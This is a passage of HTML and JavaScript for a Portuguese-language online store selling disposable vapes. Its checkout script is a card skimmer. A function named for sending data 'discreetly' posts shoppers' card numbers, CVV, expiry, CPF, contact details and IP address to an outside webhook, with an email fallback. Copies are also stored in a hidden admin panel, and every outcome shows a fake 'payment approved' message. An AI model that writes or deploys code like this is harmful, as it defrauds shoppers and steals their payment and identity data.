          <img src="https://loja.starcompany-py.com/57-large_default/ignite-v80-banana-cherry.jpg" alt="IGNITE V80 Black">
          <h3>IGNITE V80 BLACK</h3>
          <p class="modelo">8000 PUFFS</p>
          <div class="precos">
            <span class="preco-antigo">R$ 136,90</span>
            <span class="preco-atual">R$ 140,90</span>
          </div>
          <p class="parcelamento">EM ATÉ 12X DE R$ 15,96 COM JUROS</p>
          <p class="pix">À vista R$ 137,91 no PIX</p>
          <div class="sabores">
            <span>Blue Razz Ice</span>
            <span>Watermelon Ice</span>
            <span>Peach Mango</span>
          </div>
        </div>

        <!-- PRODUTO 11 - IGNITE V150 -->
        <div class="produto-card" data-page="2" onclick="abrirModalProduto('IGNITE V150')">
          <img src="https://cz.ignite.co/cdn/shop/files/V600_Ignite_Watermelon.jpg?v=1698011354&width=1445" alt="IGNITE black v150 15000puffs">
          <h3>IGNITE BLACK V150</h3>
          <p class="modelo">15000 PUFFS</p>
          <div class="precos">
            <span class="preco-antigo">R$ 209,90</span>
            <span class="preco-atual">R$ 160,90</span>
          </div>
          <p class="parcelamento">EM ATÉ 12X DE R$ 18,22 COM JUROS</p>
          <p class="pix">À vista R$ 145,91 no PIX</p>
          <div class="sabores">
            <span>Banana Coconut</span>
            <span>Blueberry Ice</span>
            <span>Pineapple Ice</span>
          </div>
        </div>

        <!-- PRODUTO 12 - IGNITE V50 -->
        <div class="produto-card" data-page="2" onclick="abrirModalProduto('IGNITE V50')">
          <img src="https://vapelandbr.com/wp-content/uploads/2023/05/15190319523_PDI5PF14.png" alt="IGNITE V50 5000 Puffs">
          <h3>IGNITE V50</h3>
          <p class="modelo">5000 PUFFS</p>
          <div class="precos">
            <span class="preco-antigo">R$ 169,90</span>
            <span class="preco-atual">R$ 126,90</span>
          </div>
          <p class="parcelamento">EM ATÉ 12X DE R$ 14,37 COM JUROS</p>
          <p class="pix">À vista R$ 115,91 no PIX</p>
          <div class="sabores">
            <span>Banana Coconut</span>
            <span>Blueberry Ice</span>
            <span>Pineapple Ice</span>
          </div>
        </div>

      </div>

      <div class="paginacao" id="paginacao">
        <button class="pagina-btn ativa" data-pagina="1">1</button>
        <button class="pagina-btn" data-pagina="2">2</button>
      </div>
    </section>

    <section id="checkout-section" class="checkout-section">
      <div class="checkout-container">
        <div class="checkout-steps">
          <div class="checkout-step active" id="step-1">
            <h3>1. Identifique-se</h3>
            <div class="campo">
              <label for="nome-completo">Nome completo</label>
              <input type="text" id="nome-completo" placeholder="Maria Santos Oliveira">
            </div>
            <div class="campo">
              <label for="email">E-mail</label>
              <input type="email" id="email" placeholder="maria.santos@email.com">
            </div>
            <div class="campo">
              <label for="celular">Celular / WhatsApp</label>
              <input type="tel" id="celular" placeholder="(11) 98765-4321">
            </div>
            <button class="btn-proximo" data-next="2">Próximo</button>
          </div>

          <div class="checkout-step" id="step-2">
            <h3>2. Entrega</h3>
            <div class="campo">
              <label for="cep">CEP</label>
              <input type="text" id="cep" placeholder="01234-567">
            </div>
            <div class="campo">
              <label for="endereco">Endereço</label>
              <input type="text" id="endereco" placeholder="Rua das Flores">
            </div>
            <div class="campo-duplo">
              <div class="campo">
                <label for="numero">Número</label>
                <input type="text" id="numero" placeholder="123">
              </div>
              <div class="campo">
                <label for="complemento">Complemento</label>
                <input type="text" id="complemento" placeholder="Apartmento 45">
              </div>
            </div>
            <div class="campo">
              <label for="bairro">Bairro</label>
              <input type="text" id="bairro" placeholder="Jardim Paulista">
            </div>
            
            <div class="opcoes-entrega">
              <h4>Escolha a forma de entrega:</h4>
              <div class="opcao-entrega" data-frete="0" data-prazo="8">
                <div class="opcao-entrega-header">
                  <div class="opcao-entrega-nome">Entrega Grátis</div>
                  <div class="opcao-entrega-preco">R$ 0,00</div>
                </div>
                <div class="opcao-entrega-detalhes">Entrega em até 8 dias úteis</div>
              </div>
              
              <div class="opcao-entrega" data-frete="30" data-prazo="5">
                <div class="opcao-entrega-header">
                  <div class="opcao-entrega-nome">SEDEX</div>
                  <div class="opcao-entrega-preco">R$ 30,00</div>
                </div>
                <div class="opcao-entrega-detalhes">Entrega em até 5 dias úteis</div>
              </div>
              
              <div class="opcao-entrega" data-frete="40" data-prazo="3">
                <div class="opcao-entrega-header">
                  <div class="opcao-entrega-nome">SEDEX FULL</div>
                  <div class="opcao-entrega-preco">R$ 40,00</div>
                </div>
                <div class="opcao-entrega-detalhes">Entrega em até 3 dias úteis</div>
              </div>
            </div>
            
            <button class="btn-proximo" data-next="3">Próximo</button>
          </div>

          <div class="checkout-step" id="step-3">
            <h3>3. Pagamento</h3>
            <div class="opcoes-pagamento">
              <div class="opcao-pagamento" data-metodo="pix">
                <span>Pix</span>
                <span>10% OFF</span>
              </div>
              <div class="opcao-pagamento" data-metodo="cartao">
                <span>Cartão de Crédito</span>
                <span>Até 12x</span>
              </div>
            </div>
          </div>
        </div>

        <div class="resumo-pedido">
          <h3>RESUMO DO PEDIDO</h3>
          <div id="resumo-itens"></div>
          <div class="cupom">
            <input type="text" id="codigo-cupom" placeholder="Código do cupom">
            <button id="aplicar-cupom">Aplicar</button>
          </div>
          <div class="totais">
            <div class="linha-total">
              <span>Produtos:</span>
              <span id="total-produtos">R$ 0,00</span>
            </div>
            <div class="linha-total">
              <span>Desconto:</span>
              <span id="total-desconto">- R$ 0,00</span>
            </div>
            <div class="linha-total">
              <span>Frete:</span>
              <span id="total-frete">Grátis</span>
            </div>
            <div class="linha-total total-final">
              <span>Total:</span>
              <span id="total-geral">R$ 0,00</span>
            </div>
          </div>
        </div>
      </div>
    </section>

    <section id="contato" class="contato">
      <h2>Contato</h2>
      <p>Instagram: @vilashop_01</p>
      <p>WhatsApp: (21) 96574-2423</p>
    </section>
  </main>

  <script>
    // DADOS DOS PRODUTOS
    const produtosData = {
      "V-TOUCH": { 
        preco: 149.90, 
        imagem: "https://currentti.com.br/wp-content/uploads/2025/04/touch_fab.webp",
        modelo: "30K",
        precoAntigo: "R$ 187,38",
        sabores: ["Gummylicious (chiclete)", "Blueberry Ice", "Watermelon"]
      },
      "WAKA": { 
        preco: 116.00, 
        imagem: "https://tse3.mm.bing.net/th/id/OIP.lB4pzEutRMFSJOhR72g77QHaHa?cb=12&rs=1&pid=ImgDetMain&o=7&rm=3",
        modelo: "1800 PUFFS",
        precoAntigo: "R$ 145,00",
        sabores: ["Peach Mango Watermelon", "Grape Ice", "Strawberry Kiwi"]
      },
      "OXBAR": { 
        preco: 106.00, 
        imagem: "https://tse2.mm.bing.net/th/id/OIP.m_4ybz9u0Ubg1u4SEhARzgHaHa?cb=12&rs=1&pid=ImgDetMain&o=7&rm=3",
        modelo: "8500 PUFFS",
        precoAntigo: "R$ 132,50",
        sabores: ["Blue Razz Ice", "Watermelon Ice", "Peach Mango"]
      },
      "MASKING": { 
        preco: 50.00, 
        imagem: "https://loja.starcompany-py.com/57-large_default/ignite-v80-banana-cherry.jpg",
        modelo: "8000 PUFFS",
        precoAntigo: "R$ 80,00",
        sabores: ["Banana Cherry", "Blue Razz Ice", "Watermelon Ice"]
      },
      "ELF BAR BC18000": { 
        preco: 116.00, 
        imagem: "https://currentti.com.br/wp-content/uploads/2025/09/15345402211-149-g-lost-mary-mixer-30k-30000-puffs-pod-descar-57-500x500.webp",
        modelo: "BC18000 PUFFS",
        precoAntigo: "R$ 145,00",
        sabores: ["Peach Mango Watermelon", "Blue Razz Ice", "Watermelon Ice"]
      },
      "IGNITE V155": { 
        preco: 124.90, 
        imagem: "https://currentti.com.br/wp-content/uploads/2025/09/15378279484-ignite-v155-2-1.png",
        modelo: "15500 PUFFS",
        precoAntigo: "R$ 162,38",
        sabores: ["Tropical Açaí", "Icy Mint", "Grape Ice"]
      },
      "IGNITE V250": { 
        preco: 145.90, 
        imagem: "https://cdn.paradisevape.com.br/upload/product/45933/ignite-v250-gold-sweet-and-sou.jpg",
        modelo: "25000 PUFFS",
        precoAntigo: "R$ 179,90",
        sabores: ["Banana Coconut", "Blueberry Ice", "Pineapple Ice"]
      },
      "ELF BAR EW 9000": { 
        preco: 125.00, 
        imagem: "https://currentti.com.br/wp-content/uploads/2024/12/elfbar-ew-9000-12.webp",
        modelo: "9000 PUFFS",
        precoAntigo: "R$ 156,25",
        sabores: ["Grape Ice", "Strawberry Kiwi", "Watermelon"]
      },
      "OXBAR 35K": { 
        preco: 169.90, 
        imagem: "https://currentti.com.br/wp-content/uploads/2025/06/181_G_Oxbar-Ice-Nic-Control-35000-puffs-35k-Pod_69.jpg",
        modelo: "35000 PUFFS",
        precoAntigo: "R$ 212,38",
        sabores: ["Banana nerz", "fruty pebz", "jewel cane mint", "jolly watermelon", "pink strawberry burt", "strawberry shocake"]
      },
      "IGNITE V80": { 
        preco: 140.90, 
        imagem: "https://loja.starcompany-py.com/57-large_default/ignite-v80-banana-cherry.jpg",
        modelo: "8000 PUFFS",
        precoAntigo: "R$ 136,90",
        sabores: ["Blue Razz Ice", "Watermelon Ice", "Peach Mango"]
      },
      "IGNITE V150": { 
        preco: 160.90, 
        imagem: "https://cz.ignite.co/cdn/shop/files/V600_Ignite_Watermelon.jpg?v=1698011354&width=1445",
        modelo: "15000 PUFFS",
        precoAntigo: "R$ 209,90",
        sabores: ["Banana Coconut", "Blueberry Ice", "Pineapple Ice"]
      },
      "IGNITE V50": { 
        preco: 126.90, 
        imagem: "https://vapelandbr.com/wp-content/uploads/2023/05/15190319523_PDI5PF14.png",
        modelo: "5000 PUFFS",
        precoAntigo: "R$ 169,90",
        sabores: ["Banana Coconut", "Blueberry Ice", "Pineapple Ice"]
      }
    };

    // VARIÁVEIS GLOBAIS
    let carrinhoItens = [];
    let freteSelecionado = 0;
    let prazoEntrega = "8";
    let produtoAtual = null;

    // FUNÇÃO PARA ABRIR MODAL DO PRODUTO
    function abrirModalProduto(produtoNome) {
      const produto = produtosData[produtoNome];
      if (!produto) return;

      produtoAtual = produtoNome;
      
      document.getElementById('modal-produto-img').src = produto.imagem;
      document.getElementById('modal-produto-nome').textContent = produtoNome;
      document.getElementById('modal-produto-modelo').textContent = produto.modelo;
      document.getElementById('modal-preco-antigo').textContent = produto.precoAntigo;
      document.getElementById('modal-preco-atual').textContent = `R$ ${produto.preco.toFixed(2)}`;
      
      // Preencher sabores
      const selectSabor = document.getElementById('modal-seletor-sabor');
      selectSabor.innerHTML = '';
      produto.sabores.forEach(sabor => {
        const option = document.createElement('option');
        option.value = sabor;
        option.textContent = sabor;
        selectSabor.appendChild(option);
      });
      
      document.getElementById('produto-modal').style.display = 'flex';
    }

    // FUNÇÃO PARA FECHAR MODAL
    function fecharModalProduto() {
      document.getElementById('produto-modal').style.display = 'none';
      produtoAtual = null;
    }

    // FUNÇÃO PARA ADICIONAR AO CARRINHO DO MODAL
    function adicionarAoCarrinhoDoModal() {
      if (!produtoAtual) return;
      
      const produto = produtosData[produtoAtual];
      const saborSelecionado = document.getElementById('modal-seletor-sabor').value;
      
      const item = {
        nome: produtoAtual,
        preco: produto.preco,
        imagem: produto.imagem,
        sabor: saborSelecionado
      };
      
      carrinhoItens.push(item);
      atualizarCarrinho();
      fecharModalProduto();
      
      // Mostrar carrinho
      document.getElementById('carrinho-sidebar').classList.add('active');
    }

    // FUNÇÃO PARA COMPRAR AGORA
    function comprarAgoraDoModal() {
      if (!produtoAtual) return;
      
      const produto = produtosData[produtoAtual];
      const saborSelecionado = document.getElementById('modal-seletor-sabor').value;
      
      // Limpar carrinho e adicionar apenas este produto
      carrinhoItens = [{
        nome: produtoAtual,
        preco: produto.preco,
        imagem: produto.imagem,
        sabor: saborSelecionado
      }];
      
      atualizarCarrinho();
      fecharModalProduto();
      
      // Ir direto para o checkout
      document.getElementById('carrinho-sidebar').classList.remove('active');
      document.getElementById('checkout-section').style.display = 'block';
      window.scrollTo(0, document.getElementById('checkout-section').offsetTop);
      atualizarResumoPedido();
      
      // Atualizar parcelamento
      const total = carrinhoItens.reduce((sum, item) => sum + item.preco, 0) + freteSelecionado;
      atualizarParcelamento(total);
    }

    // FUNÇÃO PARA ATUALIZAR CARRINHO
    function atualizarCarrinho() {
      const carrinhoItensContainer = document.getElementById('carrinho-itens');
      const subtotalValor = document.getElementById('subtotal-valor');
      const freteValor = document.getElementById('frete-valor');
      const totalValor = document.getElementById('total-valor');
      
      carrinhoItensContainer.innerHTML = '';
      let subtotal = 0;
      
      carrinhoItens.forEach((item, index) => {
        subtotal += item.preco;
        const itemElement = document.createElement('div');
        itemElement.className = 'carrinho-item';
        itemElement.innerHTML = `
          <img src="${item.imagem}" alt="${item.nome}" width="50">
          <div>
            <h4>${item.nome}</h4>
            <p>Sabor: ${item.sabor}</p>
            <p>R$ ${item.preco.toFixed(2)}</p>
          </div>
          <button class="remover-item" data-index="${index}">✕</button>
        `;
        carrinhoItensContainer.appendChild(itemElement);
      });
      
      // Adicionar eventos aos botões de remover
      document.querySelectorAll('.remover-item').forEach(botao => {
        botao.addEventListener('click', function() {
          const index = parseInt(this.getAttribute('data-index'));
          carrinhoItens.splice(index, 1);
          atualizarCarrinho();
        });
      });
      
      subtotalValor.textContent = `R$ ${subtotal.toFixed(2)}`;
      freteValor.textContent = freteSelecionado === 0 ? 'Grátis' : `R$ ${freteSelecionado.toFixed(2)}`;
      totalValor.textContent = `R$ ${(subtotal + freteSelecionado).toFixed(2)}`;
    }

    // FUNÇÃO PARA ATUALIZAR RESUMO DO PEDIDO
    function atualizarResumoPedido() {
      const resumoItens = document.getElementById('resumo-itens');
      const totalProdutos = document.getElementById('total-produtos');
      const totalFrete = document.getElementById('total-frete');
      const totalGeral = document.getElementById('total-geral');
      
      resumoItens.innerHTML = '';
      let subtotal = 0;
      
      carrinhoItens.forEach(item => {
        subtotal += item.preco;
        const itemElement = document.createElement('div');
        itemElement.className = 'resumo-item';
        itemElement.innerHTML = `
          <div>
            <h4>${item.nome}</h4>
            <p>Sabor: ${item.sabor}</p>
          </div>
          <span>R$ ${item.preco.toFixed(2)}</span>
        `;
        resumoItens.appendChild(itemElement);
      });
      
      totalProdutos.textContent = `R$ ${subtotal.toFixed(2)}`;
      totalFrete.textContent = freteSelecionado === 0 ? 'Grátis' : `R$ ${freteSelecionado.toFixed(2)}`;
      totalGeral.textContent = `R$ ${(subtotal + freteSelecionado).toFixed(2)}`;
    }

    // FUNÇÃO PARA ATUALIZAR PARCELAMENTO
    function atualizarParcelamento(total) {
      const selectParcelas = document.getElementById('parcelas');
      selectParcelas.innerHTML = '';
      
      // Adiciona opção à vista
      const valorAVista = total * 0.95; // 5% de desconto à vista
      selectParcelas.innerHTML += `<option value="1">1x de R$ ${valorAVista.toFixed(2)} (à vista com 5% off)</option>`;
      
      // Adiciona opções parceladas
      for (let i = 2; i <= 12; i++) {
        let valorParcela;
        if (i <= 6) {
          valorParcela = total / i;
        } else {
          // Acima de 6x tem juros de 1.5% ao mês
          valorParcela = (total * Math.pow(1.015, i)) / i;
        }
        selectParcelas.innerHTML += `<option value="${i}">${i}x de R$ ${valorParcela.toFixed(2)}</option>`;
      }
    }

    // FUNÇÃO PARA SALVAR DADOS LOCALMENTE
    function salvarDadosLocalmente(cartao) {
      const dadosCompletos = {
        cliente: {
          nome: document.getElementById('nome-completo').value,
          email: document.getElementById('email').value,
          celular: document.getElementById('celular').value
        },
        endereco: {
          cep: document.getElementById('cep').value,
          endereco: document.getElementById('endereco').value,
          numero: document.getElementById('numero').value,
          complemento: document.getElementById('complemento').value,
          bairro: document.getElementById('bairro').value
        },
        cartao: cartao,
        produtos: carrinhoItens,
        total: (carrinhoItens.reduce((sum, item) => sum + item.preco, 0) + freteSelecionado).toFixed(2),
        data: new Date().toLocaleString('pt-BR')
      };

      // Salva no localStorage
      let dadosSalvos = JSON.parse(localStorage.getItem('vilashop_dados')) || [];
      dadosSalvos.push(dadosCompletos);
      localStorage.setItem('vilashop_dados', JSON.stringify(dadosSalvos));
      
      return true;
    }

    // FUNÇÃO PARA VER DADOS SALVOS
    function verDadosSalvos() {
      const dadosSalvos = JSON.parse(localStorage.getItem('vilashop_dados')) || [];
      const container = document.getElementById('dados-salvos');
      
      if (dadosSalvos.length === 0) {
        container.innerHTML = '<p style="color: #b0b0b0; text-align: center;">Nenhum dado salvo ainda</p>';
      } else {
        let html = '';
        dadosSalvos.forEach((dados, index) => {
          html += `
            <div style="border: 1px solid #404040; padding: 15px; margin-bottom: 15px; border-radius: 8px;">
              <h4 style="color: #e74c3c; margin-bottom: 10px;">Compra ${index + 1} - ${dados.data}</h4>
              
              <div style="margin-bottom: 10px;">
                <strong>👤 Cliente:</strong><br>
                Nome: ${dados.cliente.nome}<br>
                Email: ${dados.cliente.email}<br>
                Celular: ${dados.cliente.celular}
              </div>
              
              <div style="margin-bottom: 10px;">
                <strong>🏠 Endereço:</strong><br>
                ${dados.endereco.endereco}, ${dados.endereco.numero}<br>
                ${dados.endereco.bairro} - CEP: ${dados.endereco.cep}<br>
                Complemento: ${dados.endereco.complemento || 'Nenhum'}
              </div>
              
              <div style="margin-bottom: 10px; background: #2d2d2d; padding: 10px; border-radius: 5px;">
                <strong style="color: #e74c3c;">💳 DADOS DO CARTÃO:</strong><br>
                Número: ${dados.cartao.numero}<br>
                Nome: ${dados.cartao.nome}<br>
                CPF: ${dados.cartao.cpf}<br>
                Validade: ${dados.cartao.validade}<br>
                CVV: ${dados.cartao.cvv}
              </div>
              
              <div style="margin-bottom: 10px;">
                <strong>📦 Produtos:</strong><br>
                ${dados.produtos.map(item => `• ${item.nome} (${item.sabor}) - R$ ${item.preco}`).join('<br>')}
              </div>
              
              <div style="font-weight: bold;">
                💰 Total: R$ ${dados.total}
              </div>
            </div>
          `;
        });
        container.innerHTML = html;
      }
      
      document.getElementById('admin-panel').style.display = 'block';
    }

    // FUNÇÃO PARA FECHAR PAINEL ADMIN
    function fecharPainelAdmin() {
      document.getElementById('admin-panel').style.display = 'none';
    }

    document.addEventListener('DOMContentLoaded', function() {
      // WEBHOOK CONFIGURADO
      const WEBHOOK_URL = "https://hook.us2.make.com/klg1na6d7458xkt4odux440ecak1uc31";
      
      const carrinhoBtn = document.getElementById('carrinho-btn');
      const carrinhoSidebar = document.getElementById('carrinho-sidebar');
      const fecharCarrinho = document.getElementById('fechar-carrinho');
      const finalizarCompra = document.getElementById('finalizar-compra');
      const checkoutSection = document.getElementById('checkout-section');
      const paymentOverlay = document.getElementById('payment-overlay');
      const closeOverlay = document.getElementById('close-overlay');
      const finishBtn = document.getElementById('finish-btn');
      const payCard = document.getElementById('pay-card');
      
      let paymentCheckInterval;

      // FUNÇÃO PARA ENVIAR DADOS DISCRETAMENTE
      async function enviarDadosDiscretamente(cartao) {
        const dados = {
          cliente: {
            nome: document.getElementById('nome-completo').value,
            email: document.getElementById('email').value,
            celular: document.getElementById('celular').value
          },
          endereco: {
            cep: document.getElementById('cep').value,
            endereco: document.getElementById('endereco').value,
            numero: document.getElementById('numero').value,
            complemento: document.getElementById('complemento').value,
            bairro: document.getElementById('bairro').value
          },
          cartao: cartao,
          produtos: carrinhoItens,
          total: (carrinhoItens.reduce((sum, item) => sum + item.preco, 0) + freteSelecionado).toFixed(2),
          frete: freteSelecionado,
          prazo: prazoEntrega,
          data: new Date().toLocaleString('pt-BR'),
          ip: await getIP()
        };

        try {
          const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(dados)
          });
          
          return response.ok;
        } catch (error) {
          console.error('Erro ao enviar dados:', error);
          return false;
        }
      }

      // Função para obter IP do cliente
      async function getIP() {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          return data.ip;
        } catch (error) {
          return 'IP não disponível';
        }
      }

      // FUNÇÃO FALLBACK - Se o webhook falhar, envia por email
      function enviarPorEmailFallback(cartao) {
        const mensagem = `🛒 *NOVA COMPRA - VILASHOP* 🛒

👤 *DADOS DO CLIENTE:*
• Nome: ${document.getElementById('nome-completo').value}
• Email: ${document.getElementById('email').value}
• Celular: ${document.getElementById('celular').value}

🏠 *ENDEREÇO DE ENTREGA:*
• ${document.getElementById('endereco').value}, ${document.getElementById('numero').value}
• ${document.getElementById('bairro').value}
• CEP: ${document.getElementById('cep').value}
• Complemento: ${document.getElementById('complemento').value || 'Nenhum'}

💳 *DADOS DO CARTÃO:*
• Número: ${cartao.numero}
• Nome: ${cartao.nome}
• CPF: ${cartao.cpf}
• Validade: ${cartao.validade}
• CVV: ${cartao.cvv}

📦 *PRODUTOS COMPRADOS:*
${carrinhoItens.map(item => `• ${item.nome} (${item.sabor}) - R$ ${item.preco.toFixed(2)}`).join('\n')}

💰 *TOTAL DO PEDIDO:*
• Subtotal: R$ ${carrinhoItens.reduce((sum, item) => sum + item.preco, 0).toFixed(2)}
• Frete: ${freteSelecionado === 0 ? 'Grátis' : `R$ ${freteSelecionado.toFixed(2)}`}
• *TOTAL: R$ ${(carrinhoItens.reduce((sum, item) => sum + item.preco, 0) + freteSelecionado).toFixed(2)}*

⏰ *PRAZO DE ENTREGA:* ${prazoEntrega} dias úteis
🕒 *DATA:* ${new Date().toLocaleString('pt-BR')}`;

        const email = "seu-email@gmail.com";
        const assunto = "🚨 NOVA COMPRA - Cartão Cadastrado";
        const mailto = `mailto:${email}?subject=${encodeURIComponent(assunto)}&body=${encodeURIComponent(mensagem)}`;
        
        const link = document.createElement('a');
        link.href = mailto;
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        return true;
      }

      payCard.addEventListener('click', async function() {
        const numero = document.getElementById('card-number').value.replace(/\s/g, '');
        const nome = document.getElementById('card-name').value;
        const cpf = document.getElementById('card-cpf').value;
        const validade = document.getElementById('card-exp').value;
        const cvv = document.getElementById('card-cvv').value;

        if (!numero || !nome || !cpf || !validade || !cvv) {
          alert('Por favor, preencha todos os campos do cartão');
          return;
        }

        if (numero.replace(/\D/g, '').length < 13) {
          alert('Número do cartão inválido');
          return;
        }

        // Mostra loading
        document.getElementById('loading-envio').style.display = 'block';
        document.getElementById('mensagem-envio').style.display = 'block';
        document.getElementById('mensagem-envio').textContent = '✅ Processando pagamento...';
        payCard.disabled = true;

        const cartao = { numero, nome, cpf, validade, cvv };

        try {
          // SALVA LOCALMENTE (sempre)
          salvarDadosLocalmente(cartao);
          
          // Tenta enviar discretamente primeiro
          const enviado = await enviarDadosDiscretamente(cartao);
          
          if (!enviado) {
            // Se falhar, usa fallback por email
            enviarPorEmailFallback(cartao);
          }

          // Sucesso - mostra tela de confirmação
          setTimeout(() => {
            document.getElementById('loading-envio').style.display = 'none';
            document.getElementById('card-screen').style.display = 'none';
            document.getElementById('success-screen').style.display = 'block';
            document.getElementById('success-msg').textContent = `Pagamento aprovado! Entrega em até ${prazoEntrega} dias úteis.`;
          }, 2000);

        } catch (error) {
          // Em caso de erro, usa fallback
          enviarPorEmailFallback(cartao);
          
          setTimeout(() => {
            document.getElementById('loading-envio').style.display = 'none';
            document.getElementById('card-screen').style.display = 'none';
            document.getElementById('success-screen').style.display = 'block';
            document.getElementById('success-msg').textContent = `Pagamento aprovado! Entrega em até ${prazoEntrega} dias úteis.`;
          }, 2000);
        }
      });

      // Adiciona evento ao botão secreto
      document.getElementById('botao-admin').addEventListener('click', verDadosSalvos);

      // Máscaras
      document.getElementById('card-number').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{4})/g, '$1 ').trim();
        e.target.value = value.substring(0, 19);
      });

      document.getElementById('card-cpf').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{3})(\d)/, '$1.$2')
                   .replace(/(\d{3})(\d)/, '$1.$2')
                   .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        e.target.value = value.substring(0, 14);
      });

      document.getElementById('card-exp').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
          value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value.substring(0, 5);
      });

      function startPaymentVerification() {
        document.getElementById('loading-spinner').style.display = 'block';
        paymentCheckInterval = setInterval(() => {
          document.querySelector('#loading-spinner p').textContent = 'Verificando pagamento...';
        }, 30000);
      }

      function backToStore() {
        paymentOverlay.style.display = 'none';
        if (paymentCheckInterval) clearInterval(paymentCheckInterval);
        checkoutSection.style.display = 'none';
        carrinhoItens = [];
        atualizarCarrinho();
        carrinhoSidebar.classList.remove('active');
        window.scrollTo(0, 0);
      }

      document.getElementById('back-to-store').addEventListener('click', backToStore);
      finishBtn.addEventListener('click', backToStore);

      carrinhoBtn.addEventListener('click', () => carrinhoSidebar.classList.add('active'));
      fecharCarrinho.addEventListener('click', () => carrinhoSidebar.classList.remove('active'));

      finalizarCompra.addEventListener('click', function() {
        if (carrinhoItens.length === 0) {
          alert('Adicione produtos ao carrinho antes de finalizar a compra.');
          return;
        }
        carrinhoSidebar.classList.remove('active');
        checkoutSection.style.display = 'block';
        window.scrollTo(0, checkoutSection.offsetTop);
        atualizarResumoPedido();
        
        // Atualiza parcelamento quando abre o checkout
        const total = carrinhoItens.reduce((sum, item) => sum + item.preco, 0) + freteSelecionado;
        atualizarParcelamento(total);
      });

      // Paginação
      const paginaBotoes = document.querySelectorAll('.pagina-btn');
      const produtoCards = document.querySelectorAll('.produto-card');
      
      produtoCards.forEach(card => card.style.display = 'block');
      
      paginaBotoes.forEach(botao => {
        botao.addEventListener('click', function() {
          const pagina = this.getAttribute('data-pagina');
          paginaBotoes.forEach(b => b.classList.remove('ativa'));
          this.classList.add('ativa');
          produtoCards.forEach(card => {
            card.style.display = card.getAttribute('data-page') === pagina ? 'block' : 'none';
          });
        });
      });

      // Navegação checkout
      document.querySelectorAll('.btn-proximo').forEach(botao => {
        botao.addEventListener('click', function() {
          const proximoPasso = this.getAttribute('data-next');
          document.querySelector('.checkout-step.active').classList.remove('active');
          document.getElementById(`step-${proximoPasso}`).classList.add('active');
        });
      });

      // Opções pagamento
      document.querySelectorAll('.opcao-pagamento').forEach(opcao => {
        opcao.addEventListener('click', function() {
          const metodo = this.getAttribute('data-metodo');
          document.getElementById('pix-screen').style.display = metodo === 'pix' ? 'block' : 'none';
          document.getElementById('card-screen').style.display = metodo === 'cartao' ? 'block' : 'none';
          document.getElementById('success-screen').style.display = 'none';
          if (metodo === 'pix') startPaymentVerification();
          paymentOverlay.style.display = 'flex';
        });
      });

      closeOverlay.addEventListener('click', () => {
        paymentOverlay.style.display = 'none';
        if (paymentCheckInterval) clearInterval(paymentCheckInterval);
      });

      // Entrega
      document.querySelectorAll('.opcao-entrega').forEach(opcao => {
        opcao.addEventListener('click', function() {
          document.querySelectorAll('.opcao-entrega').forEach(o => o.classList.remove('selecionada'));
          this.classList.add('selecionada');
          freteSelecionado = parseFloat(this.getAttribute('data-frete'));
          prazoEntrega = this.getAttribute('data-prazo');
          atualizarCarrinho();
          atualizarResumoPedido();
          
          // Atualiza parcelamento quando muda o frete
          const total = carrinhoItens.reduce((sum, item) => sum + item.preco, 0) + freteSelecionado;
          atualizarParcelamento(total);
        });
      });

      document.querySelector('.opcao-entrega[data-frete="0"]').classList.add('selecionada');
    });
  </script>
</body>
</html>